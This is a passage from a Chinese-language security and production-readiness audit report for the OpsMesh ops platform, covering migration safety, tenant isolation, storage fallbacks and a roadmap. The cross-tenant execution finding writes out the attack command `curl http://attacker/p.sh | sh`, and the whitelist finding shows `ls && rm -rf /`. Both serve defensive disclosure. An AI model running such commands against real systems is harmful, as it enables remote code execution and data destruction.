+staleness 窗口内的历史样本，避免重启后误判）。
+
+真机验收：9 个采集目标全部 `up`，`up==0` 命中 0 条，`/api/v1/alerts` 0 条 firing。
+
+---
+
+### P0-5 升级/迁移不安全：多副本竞态 + 失败静默降级
+
+> **状态：已修复（2026-09-25）**，代码 + 真实 MySQL 8.0.46 集成测试通过（含整链回滚在内的 13/13）。
+> 修复实现见本节末尾「修复交付物」，线上版本门禁实测证据见 **§10.3**。
+
+```
+证据：internal/store/sql.go  runMigrations
+  - 无 MySQL 咨询锁（全仓库无 GET_LOCK），多副本同时启动会在 schema_migrations 主键上竞争
+  - 单文件事务在 MySQL 下无意义（DDL 隐式提交），失败后无回滚
+  - 迁移失败非致命：initWithRetry 仅记日志「运行期可能不可用」并返回可用 store
+    → 服务带着半迁移的 schema 对外提供读写
+证据：internal/store/migrations/004_add_audit_trace_id.sql:13  裸 ALTER ADD COLUMN，非幂等
+证据：17 个迁移中仅 2 个有 .down.sql；无「二进制版本 ↔ schema 版本」门禁（旧二进制可跑新 schema）
+证据：pkg/migrate 为死代码（无调用方）
+```
+
+**影响**：第一次带 `replicas>1` 的滚动升级就可能出现半迁移库对外服务；回滚只能靠人工恢复备份。这是企业客户升级时的头号事故源。
+
+**修复方案（约 10–15 人天）**：引入 `GET_LOCK` 咨询锁 + 迁移前 schema 版本检查 + 失败 fail-fast（拒绝启动而非降级）+ 迁移幂等化 + 为无 down 的迁移补回滚脚本 + 删除或接入 `pkg/migrate`。
+
+**修复交付物（2026-09-25 实施）**
+
+1. **并发串行化**：`acquireMigrationLock` 用 MySQL 咨询锁 `GET_LOCK('opsmesh_mig_<库名>', 60)` 串行化迁移；
+   锁名按库隔离（多租户各 schema 互不阻塞），超长库名退化为 sha256 前缀（MySQL 锁名 ≤64 字符）；
+   锁为会话级故获取/释放共用同一 `*sql.Conn`，release 幂等且用独立 5s ctx（调用方 ctx 已取消也能释放）。
+2. **失败 fail-fast**：`initWithRetry` 失败后 `NewSQLStore` 关闭连接池并返回错误，
+   **拒绝以不完整 schema 启动**（旧实现仅记日志「运行期可能不可用」并返回可用 store）；
+   `seedRBAC` 失败同样不再吞掉——缺 admin 用户等于不可登录。
+3. **确定性故障不重试**：新增 `fatalMigrationError` 哨兵，checksum 不匹配与版本门禁命中时
+   立即返回（不做 3s×20 退避重试）。
+4. **版本门禁（新增 3.6 步）**：库内已应用版本 **高于** 本二进制已知最高版本 → 拒绝启动
+   （防二进制回滚后旧版本读写新 schema）。
+5. **迁移幂等化**：`applyMigration` 去掉事务（MySQL DDL 隐式提交，「单文件事务」对 DDL 是幻觉），
+   改为**可重放**：1050/1060/1061/1091 四类「对象已存在/不存在」错误**必须**先经
+   `information_schema` 二次核实（`parseIdempotentDDL` + `ddlTargetExists`）且与期望状态一致才放行，
+   无法结构化解析的语句一律失败退出（不吞错）。半迁移中断后重启即可自愈收敛。
+6. **回滚脚本补齐**：18 个迁移全部配 `.down.sql`（001 重写为真实逐表 DROP 并加破坏性警告；
+   003 因表归属 001 保持说明性占位）。`.down.sql` 由 `migrationFiles()` 显式跳过，不参与自动执行。
+7. **删除死代码** `pkg/migrate/`（808 行 + 24 测试，零调用方，且其 `_migrations` 表与现状冲突）。
+8. **文档**：`docs/operations.md` §6.3 重写为「schema 迁移与回滚」（机制表 + 迁移清单 + 手工回滚流程 + 升级顺序约束）。
+
+**实测收口（真实 MySQL 8.0.46，`internal/store/migration_test.go` 集成层，含 4 组纯逻辑测试共 13/13 通过；复跑记录见 §10.3）**：
+`TestRunMigrationsFreshDB`（全新库建齐 21 张表）、`TestRunMigrationsIdempotent`（连跑 3 次）、
+`TestSchemaMigrationsTable`、`TestMigrationLock_ExcludesOtherSession`（B 会话等锁超时 → 释放后成功）、
+`TestRunMigrations_VersionGate`（库内 9999 → 拒绝启动且为 fatal 类）、`TestRunMigrations_ChecksumGateFatal`、
+`TestRunMigrations_ReplayAfterHalfApplied`（删掉版本记录模拟半迁移 → 重放收敛）、
+`TestRunMigrations_ConcurrentStores`（4 个 store 并发构造全部成功）、
+`TestMigrationDownScripts_UnwindChain`（倒序执行全部 down 脚本 → 库内只剩 `schema_migrations`）。
+另有 5 组纯逻辑测试（`splitSQLStatements` / `migrationFiles` 排序 / `parseIdempotentDDL` 正负例 /
+锁名构造 / `fatalMigrationError` 穿透）无需 DB 即可回归。
+
+---
+
+### P0-6 多租户隔离：生产模式下买不到，且代码里存在跨租户命令执行 🔴
+
+> **状态：问题 A / 问题 B 均已修复（2026-09-25）**，代码 + 单元/负向测试通过。
+> 修复实现见本节末尾「修复交付物」，线上落库与越权拒绝实测证据见 **§10.4**。
+
+这一项有两个独立问题，叠加后结论是「多租户既不可用也不安全」。
+
+**问题 A：内置用户中心无法表达租户，生产模式下多租户不可用。**
+
+```
+证据：internal/store/models.go:16-28  User 结构体【没有 TenantID 字段】
+证据：internal/controlplane/auth_tokens.go:216-219  签发 JWT 时硬编码 TenantID: "default"
+      （注释："用户中心为平台级，统一 default 租户"）
+证据：--trust-gateway-headers（网关注入角色的唯一路径）在生产模式被强制 false
+      （config.go:796-800）
+实测：生产模式下伪造 X-Tenant-ID → 401 "identity header without verifiable credential"
+```
+
+即：内置路径签发的所有用户恒在 `default` 租户；网关路径在生产被禁用。**README「IAM 与租户隔离」所描述的按租户隔离，在实际生产部署中无法配置出来**（用户无法被指派到租户）。若产品要按多租户售卖，这是结构性缺口。
+
+**问题 B：四条「下发到 agent」的路径缺少 AgentID 的租户校验，而任务队列按 agentID 寻址。**
+
+这是当前代码中真实存在的**跨租户远程命令执行**漏洞：
+
+```
+【创建侧缺校验】以下路径取了请求体里的 deviceID/agentID 直接建任务，未校验目标 agent 属于调用方租户：
+  internal/controlplane/script.go:293-301        POST /api/v1/scripts/{id}/execute  ← 且 sc.Content 未过 validateCommand
+  internal/controlplane/automation.go:47-60      automation execute_task 动作（command 来自用户规则参数）
+  internal/controlplane/config_hotpush.go:84-91  配置热推（TaskTypeFile 写文件）
+  internal/controlplane/config_hotpush.go:168-176 canary 批量（agentIDs 数组）
+  对照：server_tasks.go:155-157 等路径【有】正确的 agent.TenantID != tenant → 403 校验
+【消费侧无租户维度】任务队列按 agent_id 单独寻址：
+  internal/store/sql_tasks.go:499-502
+    SELECT ... FROM tasks WHERE agent_id=? AND (status IS NULL OR status='pending') ... LIMIT 1 FOR UPDATE
+  internal/store/memory.go:693-711  m.tasks[agentID] 遍历
+  → 无 tenant_id 过滤；agent 侧执行时亦不校验 task.TenantID（agent.go:905-920）
+```
+
+**攻击链**（已通过代码逐环节确认）：
+1. 租户 A 中具备 `script:write`/`cmdb:write` 的主体（`cmdb` 属 operatorGroups，故**默认 operator 角色即可**）创建一个内容为 `curl http://attacker/p.sh | sh` 的脚本；
+2. `POST /api/v1/scripts/{id}/execute {"deviceID":"<租户 B 的 agentID>"}` → 无租户校验，任务创建成功；
+3. 租户 B 的 agent 按 agent_id 领取并执行该任务（通常以 root 身份）。
+
+**商用影响**：租户隔离是多租户运维平台的**核心商业承诺**，这条路径一旦被客户的安全团队发现，交易即终止。当前 exploitability 取决于部署中是否真实存在多个租户（内置用户中心下不会，安装令牌/网关注入下会），但**只要卖出多租户版本就立刻成为最高危漏洞**。
+
+**修复方案（约 5–10 人天）**
+1. 四条路径统一补 `lookupAgent` + `agent.TenantID != callerTenant → 403`（可直接复用 `server_tasks.go:155` 的既有模式，改动很小）。
+2. 任务领取 SQL 增加 `tenant_id=?` 条件（agent 侧携带自己的租户）作为第二道闸。
+3. `script.Content` 入队前过 `validateCommand`（当前完全绕过）。
+4. 战略决策：若要卖多租户，需在 User 模型加 TenantID 并放开 Y 路径的租户作用域；若不卖，则应在 README 中**明确降级该宣传点**。
+
+**修复交付物（2026-09-25 实施，问题 A + 问题 B 一并修复）**
+
+问题 A（用户中心支持租户）：
+1. `store.User` 增加 `TenantID` 字段（`internal/store/models.go`），持久化列 `users.tenant_id`
+   由迁移 `018_users_tenant_id.sql` 引入（含 `.down.sql` 回滚）；SQLStore 的用户查询/写入
+   全部带上该列（`userColumns` 常量），MemoryStore seed 账号统一 `DefaultTenantID`。
+2. 签发 JWT 不再硬编码 `TenantID: "default"`（`auth_tokens.go`）：改为取用户自身 `TenantID`
+   （空值归一为 default）。`tenantFromBearer` 由此拿到真实用户租户，**网关路径之外的内置登录
+   路径也能表达租户**（`TestLogin_JWTContainsUserTenant` 断言 `/me` 与 bearer 解析均为 acme）。
+3. 用户创建/更新入口新增租户指派与校验（`auth_users.go`）：平台管理员可指派任意合法租户；
+   租户管理员只能在本租户内创建（跨指派 403）；租户 ID 走白名单正则
+   `^[A-Za-z0-9_.-]{1,64}$`（`validateTenantID`），因为该值会流入多租户 schema 名。
+4. `RequireAuth` 拒绝空租户（无租户上下文的用户不可进入业务路径）。
+
+问题 B（跨租户命令执行）：
+5. **下发侧统一收口**：新增 `internal/controlplane/tenant_guard.go`，提供 `requireTenantAgent`
+   （HTTP 路径，失败写 403）/ `tenantAgent`（非 HTTP）/ `tenantAgentIn`（无 `*Server` 引用的执行器）
+   三个入口，判定语义与既有正确实现（`handleCreateTask` 等）逐字一致：
+   `agent == nil || (tenant != "" && agent.TenantID != tenant)` → 拒绝。
+   四条漏洞路径全部改走该入口：`script.go`（脚本执行）、`automation.go`（执行器
+   ExecuteTask/Scale/Restart/Isolate）、`config_hotpush.go`（热推 + canary 批量，批量在**建任何任务前**
+   先全量校验，避免部分成功）、`server_tasks.go` 的 `validateCommand` 注释同步纠正。
+6. **脚本内容不再绕过命令校验**：脚本执行路径的任务 command 是脚本体，此前完全不过
+   `validateCommand`；现已在入队前校验（含管道/重定向等元字符一律 400），并在
+   `validateCommand` 注释中写明「脚本路径同样受限，如需复合命令应拆分任务并由部署方放开
+   agent 端白名单」。
+7. **领取侧数据层兜底**（第二道闸，防止未来新增路径漏校验）：
+   `SQLStore.ClaimTask` 的 SELECT 增加 `AND (tenant_id IS NULL OR tenant_id='' OR tenant_id=?)`，
+   `?` 取「agent 自身租户」（`s.Agent(agentID)`）；`MemoryStore.ClaimTask` 同语义。
+   **刻意不改 `Store` 接口签名**（`ClaimTask(agentID string)` 保持原样），避免 ~35 处测试调用改写；
+   任务侧租户为空视为「存量无标记数据」放行，不饿死历史任务。
+   语义已验证：跨租户任务会被**跳过**（继续尝试后续可领任务），而非简单返回 nil。
+
+**负向测试（新增 3 个测试文件，全部通过）**：
+`internal/controlplane/tenant_isolation_test.go`（脚本执行 / 热推 / canary 批量 / 自动化执行器
+四条路径的跨租户 403 + 「同租户放行」正例 + 「拒绝时不产生任何任务」断言 + 注入型脚本内容 400）、
+`internal/controlplane/tenant_users_test.go`（租户指派权限边界、`/me` 与 JWT 租户一致性、
+列表不跨租户泄漏）、`internal/store/claim_tenant_test.go`（领取侧跳过跨租户任务、
+空租户兼容、同租户正常领取）。
+
+---
+
+### P0-7 微服务持久化被静默降级：生产库里没有表（数据重启即丢）✅ 已修复（2026-09-25，端到端实证见 §9.4）
+
+**这一项是「真机跑起来」才发现的，静态读代码看不出——因为代码「看起来」是支持 SQL 的。**
+
+```
+证据：docker logs opsmesh-alert-svc
+  MySQL store 初始化失败，回退 memory: open mysql: invalid bool value: true?parseTime=true
+证据：docker logs opsmesh-config-svc   → 同样一行
+证据：SHOW TABLES FROM opsmesh_alert / opsmesh_config / opsmesh_log
+  → 三个库都由 init-databases.sql 建好了，但【一张表都没有】
+证据：services/{alert,config}-svc/internal/store/mysql.go  ensureParseTime()
+  → 无条件在 DSN 末尾追加 "?parseTime=true"
+实证（驱动层对照）：
+  旧实现输出 .../opsmesh_alert?parseTime=true?parseTime=true → mysql.ParseDSN err=invalid bool value: true?parseTime=true
+  新实现输出 .../opsmesh_alert?parseTime=true                → mysql.ParseDSN err=<nil>
+```
+
+**影响**：compose 已为 alert-svc / config-svc 配好 `*_STORE_TYPE=sql` 与 DSN（即运维明确要求持久化），
+但 DSN 拼接缺陷让 `sql.Open` 必然失败，服务只打一行日志就**静默退回内存存储**：
+告警规则、告警记录、静默、配置项、配置历史、密钥全部只活在进程里，**重启即归零**；
+而 `/health` 依然是 200，`deploy.sh` 冒烟测试全绿，监控也看不见——这是最难在客户现场排查的一类故障。
+
+波及面（同类实现共 10 个服务）：alert、autoscaler、config、deploy、gpu、incident、log、plugin、portal、workflow。
+其中 compose 生产栈内实际命中：**alert-svc、config-svc**（`opsmesh_log` 因 log-svc 走 loki 后端未接 SQL，暂无数据面影响）。
+
+**修复交付物（2026-09-25 实施）**
+1. 10 个服务的 `ensureParseTime` 改为幂等实现（已含 `parseTime=` 直接返回；已含 `?` 则用 `&` 追加），
+   每个服务补 `internal/store/dsn_test.go` 回归测试（3 个用例：无参数 / 已含 parseTime / 仅含其它参数）。
+   10 个模块 `go test` 全绿；把旧实现临时还原后测试确实失败（非「永远通过」的假测试）。
+2. **SQL 初始化失败不再静默回退**：8 个服务（alert/auth/config/deploy/device/incident/plugin/portal）
+   的 `log.Printf("...回退 memory")` 改为 `log.Fatalf("...停止启动")`，与 task-svc 及控制面
+   `--production` 的既有 fail-fast 策略对齐（`docs/architecture.md:871` 早已写明该原则，
+   微服务此前的回退行为与文档不一致）。
+
+**防回归**：`dsn_test.go` 随各模块 CI 执行；fail-fast 属「配置要求 SQL 就必须真上 SQL」的语义，
+不满足即拒绝启动，不会再有第二条静默降级路径。
+
+**实测收口（2026-09-25，真机）**：重新部署后 `opsmesh_alert` 有 3 张表、`opsmesh_config` 有 5 张表
+（修复前均为 0 张），`alerts` / `config_entries` 均可 SELECT；负向用例「非法 DSN 启动 alert-svc」
+返回退出码 1 并打印 `MySQL store 初始化失败，停止启动`。完整记录见 §9.4 / §9.6。
+
+---
+
+## 3. P1 高风险项（商用前应修，可排在 P0 之后）
+
+| # | 问题 | 证据 | 商用影响 | 工作量 |
+|---|---|---|---|---|
+| **P1-1** | **agent 命令白名单可被 `&&` 绕过**。`--agent-shell-whitelist` 只校验首个 token，而 `&&` 两端均放行（agent 侧 `agent.go:1043-1048`，控制面 `server_tasks.go:94-99`）。`ls && rm -rf /` 首 token `ls` 命中白名单，右侧照常执行。代码注释称 `&&`「不引入任意命令执行」——该推理对白名单场景不成立。 | `internal/agent/agent.go:1077-1115`（白名单）、`agent.go:1020-1022`（明确不拦管道 `\|`）、`internal/controlplane/server_tasks.go:90`（控制面【有】拦管道） | 默认开启的白名单被宣传为生产加固项，实际不提供隔离；且两端策略不一致（控制面拦 `\|`、agent 不拦） | 1–2 pd |
+| **P1-2** | **全机群共用一个 agent HMAC 密钥，且签名不覆盖载荷**。签名为 `HMAC(secret, timestamp+agentID)`，不覆盖任务内容/结果；`Register` 不返回 per-agent 密钥；agent 执行 shell 任务时不隔离环境变量，故任一 agent 被 RCE 即泄漏全机群密钥。 | `internal/controlplane/grpc/grpc.go:294-297`、`:274-277`；`internal/agent/agent.go:1149-1154`（未设 cmd.Env） | 单点失守 → 全机群可被冒领任务、可伪造上报结果（审计可信度归零）；无按 agent 吊销能力 | 5–8 pd |
+| **P1-3** | **审计日志不可防篡改，且无保留策略、无查询索引**。`audit_log` 为普通追加表，无 hash 链/签名（`migrations/001_initial.sql:78-86`）；全仓库无 DELETE/归档/分区逻辑；`QueryAudits` 以 `tenant_id + created_at` 过滤但仅 `idx_audit_trace` 一个索引，长期运行后审计检索将全表扫描。 | `internal/store/sql_audits.go`、`migrations/001_initial.sql`、`internal/controlplane/server_audits.go:15-16` | README「100% 留痕 / 等保三级 ≥6 月」仅靠「永不删除」满足，但**无防篡改**（持 DB 凭证即可改写历史，等保三级明确要求审计记录防篡改）；且查询会随时间劣化 | 3–5 pd |
+| **P1-4** | **无界的 agent 日志缓冲会导致进程 OOM**。`agentLogs` 切片按 agent 每 30s 追加且永不裁剪；`deviceMetrics` map 无淘汰。 | `internal/store/sql_agent_logs.go:24-27` 及 memory 同名实现 | 机群规模上去后数周内控制面 OOM；商用 SLA 不可承诺 | 2–3 pd |
+| **P1-5** | **未鉴权即可造成指标内存耗尽 DoS**。中间件对**每个请求**（含 404 与未鉴权请求）记录指标，`normalizePath` 仅归一全数字段，`/api/v1/<随机串>` 原样入 map 且无上限；`/metrics` 默认放行（空 CIDR 白名单=不限制），无全局限流器。 | `internal/controlplane/server_middleware.go:169-177,207-228`、`internal/metrics/metrics.go:61-66,100-110`、`internal/controlplane/server_netsec.go:129-131` | 远程未鉴权即可打爆内存导致控制面重启 | 2–3 pd |
+| **P1-6** | **可支撑性缺口**（影响交付后的运维成本）。无版本端点、无 pprof、无配置转储、无诊断包；日志级别硬编码 Info；`/metrics` 抓取本身会做 4 次全表读。 | `internal/controlplane/server_lifecycle.go`（151 条路由中无上述项）、`internal/logx/logx.go` | 客户现场排障必须 SSH + 看源码，支持成本高、无法远程定位问题 | 6–10 pd |
+| **P1-7** | **许可与第三方合规未就绪**。LICENSE = Apache-2.0（`Copyright 2026 OpsMesh Contributors`），**无 NOTICE / THIRD_PARTY 清单**；依赖含 MPL-2.0 组件（go-sql-driver/mysql、hashicorp/vault/api、terraform-plugin-sdk/v2）；Helm 应用商店 28 个条目引用 bitnami 仓库与 bitnami.com 图床，而 Bitnami 已于 2025 年调整镜像授权策略。 | `LICENSE`、`go.mod`、`internal/helm/catalog.go` | 采购/法务尽调会要求第三方声明；Apache-2.0 意味着**任何第三方可自由再分发你的商业产品**（是否可接受需商业决策）；应用商店在客户无外网时不可用，且可能撞上 Bitnami 授权限制 | 3–5 pd + 法务 |
+| **P1-8** | ~~控制面的 M3/M5 子存储仍可静默退回内存~~ **✅ 2026-09-25 已修**。`NewDeployHandler` / `NewOrchestrationHandler` 在 `deploy.NewSQL` / `orchestration.NewSQL` 构造失败时只 `logx.Error` 后改用 `Memory`，且工厂拿不到 `cfg.Production`，故生产模式下同样静默。 | `internal/controlplane/factory/server_factory.go`（原 `:32-47`、`:51-66`）；调用方 `internal/controlplane/server.go:309-310` 未传生产标志 | 部署模板/M5 编排数据在重启后丢失，而 `/health` 与界面均正常。触发窗口窄（主 store 已在同一 DSN 上跑完迁移，通常先失败），但属「配置要求持久化却跑在内存」的同一类缺陷 | **修复**：工厂接线生产标志，生产模式下子存储构造失败改为 fail-fast（对齐既有阻断先例），`server_factory_test.go` 覆盖两分支；验证见 §10.5 |
+| **P1-9** | **交付树中残留开发调试页面，内含硬编码凭据**。`deploy/docker/index.html` 是一份手工冒烟测试页：登录表单把 `viewer` / `viewer123` 直接写死在 `value=` 属性里，`var API = 'http://localhost:8080'` 硬编码明文地址，「改密」按钮把口令固定改成 `NewPass123`，并把 token 前 30 字符回显到页面。该文件**未被任何 compose/部署文件引用**（孤立文件），因此未被实际部署——但它是残留物，且恰好印证了 P0-1：团队自己的测试习惯仍依赖 `viewer123` 可用，这可能是该账号在生产存活未被察觉的原因之一。 | `deploy/docker/index.html`（全文） | 交付物卫生问题；若被误拷入静态目录即成凭据泄露；给客户做源码审计时会被质疑 | ✅ 2026-09-25 已删除（随 P0-4 遗留物清理批次）；复核 `deploy/docker/` 现仅剩 Dockerfile/脚本/证书与 compose |
+
+---
+
+## 4. 真正值得肯定的部分（避免低估）
+
+评估应双向诚实。以下是我实际验证后确认**做得好**的地方：
+
+1. **核心卖点不是 PPT**。`pkg/provision/auto.go:111` 真的调用 `discover.Sweep(ctx, cidr, []int{22,9100}, ...)` 做 TCP 扫描，并有 SSH 推送信号量限流（`sshSem` 并发 8）、advertise 格式白名单、生产模式强制 HTTPS（防中间人投毒 agent 二进制）。**「网段自动发现纳管」是真实现的。**
+2. **持久化是真的**。`internal/store/` 有 100+ 文件，35 个领域接口 × 3 种实现（Memory/SQL/MultiSchema）+ 编译期断言；`sql_ticket.go`/`sql_slo.go`/`sql_traffic.go`/`sql_billing.go` 等为真实 CRUD。此前担心的「15 个领域桩实现」经核实**已全部落地**（`StubDomains = []string{}`，且 `StubNotImplemented` 在非测试代码中**零调用点**）。
+3. **版本化迁移框架存在**（17 个迁移 + checksum 记录 + 部分 down 脚本），虽然安全性有 P0-5 的问题，但框架本身是对的，不是裸 `CREATE TABLE`。
+4. **前端 XSS 防护经核实良好**（我独立复核了安全子代理的结论）。个人版 209 处 `innerHTML` 中 **205 处是 `innerHTML = ''` 清空**，1 处为静态 SVG 图标表，1 处 `el()` 的 `html` 键**全仓库零调用者**；文本一律走 `textContent`/`createTextNode`。两版前端均无 `eval`/`new Function`/`v-html`。CSP 为 per-request nonce 且已移除 `script-src 'unsafe-inline'`。
+5. **防守意识好的细节**（读代码时反复出现）：租户头伪造被拒绝并给出可操作提示；`validateCommand` 与控制面/agent 双层校验的纵深设计意图；联邦转发 HMAC 覆盖 method+path+ts+identity+body；CI 用 `shadow-observe` 双轨对照抓出真实 bug；登录防爆破在我实测中确实触发了 429。
+6. **i18n 完整**：企业版 en/zh 各 2482 个键，数量完全对齐——不是「只做中文」。
+7. **测试投入真实**：`internal/agent` 单包测试耗时 64 秒并通过，说明有实质用例而非空壳；`internal/authctx`、`pkg/tenant` 亦实测通过。
+8. **依赖安全状况良好（独立复验）**：本次实际运行 `govulncheck ./...` → **`No vulnerabilities found`（0 个可达漏洞）**，仅有 1 个存在于所需模块中但代码不可达的告警。这与项目 `.trivyignore` 中「经符号级可达性分析确认不可达」的豁免依据一致——该豁免是**有据可查的合规豁免，而非一豁了之**。企业客户的安全评审在这一项上会顺利通过。
+
+---
+
+## 5. 需要你做的架构决策（非缺陷，但影响商用成本）
+
+**双轨架构的代价正在显现，建议尽早收敛。**
+
+| 现状 | 数据 |
+|---|---|
+| 单体控制面 | `internal/` 非测试 74,773 行，其中 `internal/controlplane` 一个包 **56,150 行 / 155 个文件**（占内核 75%） |
+| 18 个微服务 | `services/*` 非测试约 52,797 行，每个 `go.mod` 均含 `replace github.com/Levango7/OpsMesh => ../../` |
+| 默认部署 | README 明确「微服务部署（可选，默认不启用）」——即默认交付路径**不使用**这 5.3 万行 |
+
+**两个具体问题**：
+
+1. **微服务不是独立模块**。`replace` 指向 `../../` 意味着它们无法独立版本化、独立发布；根模块任何改动都可能同时打破 18 个服务。这与「微服务」的工程目的相悖。
+2. **同一领域两套实现需人工保持同步**。例如 `services/task-svc/internal/store/mysql.go`（857 行）与 `internal/store/sql_tasks.go`（750 行）是 task 域的两份独立实现。项目为此付出了 `docs/td60-consistency-report.md`（47KB 一致性报告）+ shadow-observe CI 的持续成本。
+
+**建议**：明确二选一。若目标客户是中大型企业私有化部署（当前能力与文档均指向此），**单体 + 干净的单包边界**更划算；把微服务降级为「规模化预留」并冻结投入，直到确有客户需求。这笔省下的维护成本，远大于 P0 修复的总和。
+
+---
+
+## 6. 商用路线图
+
+### 阶段一：可交付（必做，约 25–40 人天）—— ✅ 已全部完成
+目标是「客户能装上、能登进去、能安全用」。
+
+| 顺序 | 事项 | 工作量 | 出口标准 |
+|---|---|---|---|
+| 1 | ~~P0-1 管理员口令可控 + 种子账号强制轮换~~ ✅ 2026-09-25 | ~~2–3 pd~~ | ~~生产模式下运维可登录；种子口令无法登录~~ 已达成 |
+| 2 | ~~P0-2 HTTP TLS 或修正文档 + 移除误导性 HSTS~~ ✅ 2026-09-25 | ~~1–3 pd~~ | ~~浏览器流量全程加密或明确由代理终止~~ 已达成（`--http-tls` 三态，生产默认 HTTPS） |
+| 3 | ~~P0-4 部署资产修复~~ ✅ 2026-09-25 | ~~5–8 pd~~ | ~~`docker compose up` 与 `helm install` 开箱即通~~ 已达成（compose 真机 17 容器全 Up） |
+| 4 | ~~P0-6 租户校验补齐（4 条路径 + 队列过滤）~~ ✅ 2026-09-25 | ~~5–10 pd~~ | ~~跨租户下发返回 403；集成测试覆盖~~ 已达成（`tenant_guard.go` 统一入口 + 4 路径接线 + 领取侧 SQL 门 + 伪造租户头 401） |
+| 5 | ~~P0-3 企业版前端纳入交付~~ ✅ 2026-09-25 | ~~3–5 pd~~ | ~~`/enterprise/` 可用；CI 构建产物入库~~ 已达成（构建期 `go:embed` 进二进制；产物不入库，由嵌套 `.gitignore` 白名单化；CI 黑盒断言） |
+| 6 | ~~P0-5 迁移加锁 + 失败 fail-fast~~ ✅ 2026-09-25 | ~~10–15 pd~~ | ~~3 副本并发启动迁移通过；失败拒绝启动~~ 已达成（咨询锁 + checksum/版本门禁 + 可重放；真实 MySQL 13/13 集成测试通过） |
+| 7 | ~~P0-7 微服务持久化静默降级~~ ✅ 2026-09-25（评估中发现） | ~~3–5 pd~~ | ~~生产库真实建表、重启不丢数据~~ 已达成 |
+| 8 | ~~P1-8 M3/M5 子存储静默降级~~ ✅ 2026-09-25 | ~~1 pd~~ | ~~生产模式构造失败 fail-fast~~ 已达成 |
+
+> **本阶段已收口**：7 项 P0 阻断项 + 1 项同类 P1 全部修复，并以真机全栈复验（`verify-runtime.sh` 58 项全过、
+> 静态门禁 20 项全过、真实 MySQL 迁移集成测试 13/13）为交付证据。详细记录见 §9 / §10。
+
+### 阶段二：可运维（约 12–20 人天）
+目标是「出问题能查、能升级、能恢复」。
+
+- P1-1 白名单绕过修复（1–2 pd）
+- P1-4 日志/指标缓冲加上限与淘汰（2–3 pd）
+- P1-5 指标基数控制 + `/metrics` 生产默认受限（2–3 pd）
+- P1-6 版本/诊断端点 + 日志级别可配 + 结构化日志统一（6–10 pd）
+- `docs/dr-runbook.md` 恢复流程可执行化（当前手册读 `/backup`，而 `mysql-statefulset.yaml` 并未挂载该路径 → 首次演练必失败）（1–2 pd）
+
+### 阶段三：可销售（约 10–20 人天 + 法务）
+目标是「采购、法务、安全评审能过」。
+
+- P1-7 THIRD_PARTY/NOTICE 清单 + MPL 声明 + 明确 Apache-2.0 的再分发含义（是否引入商业许可/EULA 需你决策）（3–5 pd + 法务）
+- P1-3 审计防篡改（hash 链或外部 WORM 归档）+ 保留/归档任务 + `(tenant_id, created_at)` 复合索引（3–5 pd）
+- 企业级能力补齐（按目标客户取舍）：SSO/LDAP/OIDC、真实 HA failover（当前 `handleHAFailover` 为 no-op 返回 `"simulated": false`）、白标、离线安装包 —— 约 20–30 pd，**建议与首个客户的真实需求挂钩后再投入**，不要预先建设。
+
+### 阶段四：规模化（按需）
+- P1-2 per-agent 凭证 + 签名覆盖载荷（5–8 pd）
+- 双轨架构收敛决策落地
+- 首次真实负载测试（当前仓库内**无任何压测结果**，而每 agent 2s 一次的取消轮询意味着 1000 agent ≈ 500 req/s 的固定开销，应实测确认）
+
+---
+
+## 7. 与既有评估报告的关系（重要）
+
+`docs/evaluation-report.md` 的结论是「35/35 已修复、0 遗留、生产可用，但有 8 项高风险需修复」。本报告需要指出三点：
+
+1. **它的「生产可用」结论未经运行验证。** 35 项修复全部集中在代码质量、文档一致性、Operator 安全配置等**静态维度**，而本次发现的 6 个 P0 全部是**动态/配置维度**——它们只有在真正以生产参数启动产品时才会暴露。这解释了为什么「35/35 已修复」与「生产模式登不进去且可被接管」可以同时成立。
+2. **它有一处结论被实测证伪**：第 7 章安全评估将预置弱口令判为「被强制改密机制中和」。实测表明该机制不阻止用已知旧口令改密并取得会话（见 P0-1）。
+3. **它修复的同类问题出现回归**：`evaluation-report.md` H2 专门修复过「注释与实现不符」，但本次仍发现同类漂移——`dashboard.go:13` 称个人版「已收敛为极简引导页」，实为 35KB／19 个 tab 的完整 SPA；`stub_guard.go`/`config.go` 注释引用 `sql_p01.go ~ sql_p06.go`，**这些文件不存在**（真实实现为 `sql_ticket.go`/`sql_slo.go` 等按域命名）。**说明「文档漂移」不是一次性修复项，而是需要 CI 持续守住的机制**（建议：把注释中引用的文件名纳入 CI 存在性校验）。
+
+---
+
+## 8. 交付建议
+
+**不要在当前状态下启动正式商用销售。** 但也不需重写——这个项目的底盘是好的：
+
+- 6 个 P0 里，P0-1、P0-2、P0-4 是**配置与文档级**问题，修复成本低（**P0-1、P0-2 已完成，合计 3–6 人天**；P0-4 剩 5–8 人天）而收益极高；
+- P0-6 与 P0-5 是**真实缺陷**，但定位精确、改动集中（约 15–25 人天）；
+- P0-3 是**交付包装**问题。
+
+**建议路径**：先用 2–3 周完成阶段一，然后**做一次真实客户环境的落地试用**（推荐 1 个网段 / 20–50 台设备），用它来校验阶段二、三的优先级。在完成阶段一之前，任何「生产可用」的对外表述都应撤下——尤其是 `DELIVERY.md` §3 的「全量验证结果 ✅」表格，它验证的是 `go build/vet/test`，与产品能否交付无关。
+
+---
+
+*本报告所有结论均基于对 `F:\Nexus\OpsMesh`（commit `2c87a0b`）的只读静态分析 + 二进制实际运行验证。报告中标注的文件行号在评估时点有效。评估阶段未修改任何项目文件；测试用的临时二进制、证书与进程已全部清理。*
+
+*后续修复实施（P0-1、P0-2，2026-09-25）已改动仓库代码与部署资产，改动清单见 §2 各节「修复交付物」；验证方式均为「编译 → 真机黑盒 → 回归测试全绿」三段式，不依赖静态推断。*
+
+---
+
+## 9. 真机全栈验证记录（2026-09-25，P0-1 / P0-2 / P0-4 / P0-7 收口验收）
+
+> 本节回答的是「修复到底有没有真的交付」。所有数字来自真机执行，命令可复现；断言脚本随仓库交付
+> （`deploy/scripts/verify-runtime.sh`，只读、退出码即结论），不依赖评估者本机环境。
+
+### 9.1 被测对象与执行方式
+
+| 项 | 值 |
+|---|---|
+| 被测量 | `deploy/docker/docker-compose.prod.yml`（生产形态：HTTPS + 加密密钥 + 强口令 + 微服务独立库） |
+| 启动命令 | `bash deploy/docker/scripts/deploy.sh up -y`（`-y` = 非交互确认端口占用；占用方即上一次部署的本栈） |
+| 启动结果 | **退出码 0**；耗时约 12 分钟（含 10 个镜像重建：控制面 + 9 个微服务）；`[ERROR]` 计数 0 |
+| 独立复验 | `bash deploy/scripts/verify-runtime.sh` → **PASS=38 FAIL=0**（退出码 0） |
+| 静态门禁 | `bash deploy/scripts/validate-deploy-assets.sh` → **PASS=20 FAIL=0** |
